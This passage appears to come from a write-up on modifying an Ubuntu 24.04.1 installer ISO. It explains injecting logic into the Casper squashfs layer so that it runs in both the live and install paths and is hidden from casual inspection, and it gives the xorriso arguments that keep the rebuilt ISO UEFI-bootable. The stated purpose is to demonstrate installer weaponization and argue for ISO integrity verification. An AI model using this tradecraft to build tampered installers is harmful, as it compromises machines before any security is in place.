I captured the original ISO's El Torito and hybrid boot structure before any change and compared the rebuilt ISO against that reference to confirm UEFI bootability was preserved. Targeting the base Casper layer means the injection fires on both the Live session and the install path, and it keeps the forensic surface to a single modified artifact: the chosen squashfs layer. The logic lives inside a compressed filesystem image, where it must be deliberately unpacked and diffed to be found.

On Ubuntu 24.04.1, the ISO uses GRUB2 for legacy BIOS boot and an appended EFI partition for UEFI boot, so the rebuild must use `xorriso` with the exact El Torito and isohybrid arguments reported by `-report_el_torito as_mkisofs`, including the `--grub2-mbr` source, the `-append_partition 2` byte range and GUID, and the `-b '/boot/grub/i386-pc/eltorito.img'` boot image path. A simple `mkisofs` command produces an ISO that fails to boot on UEFI. This work demonstrates how installation media can be weaponized at the deployment stage, before any endpoint security is in place, and why verifying the integrity of installation ISOs matters on modern, UEFI-booting machines as much as on legacy systems.

For more advanced automation, consider using live-build or livecd-rootfs, which are Canonical's official tools for building Ubuntu images.
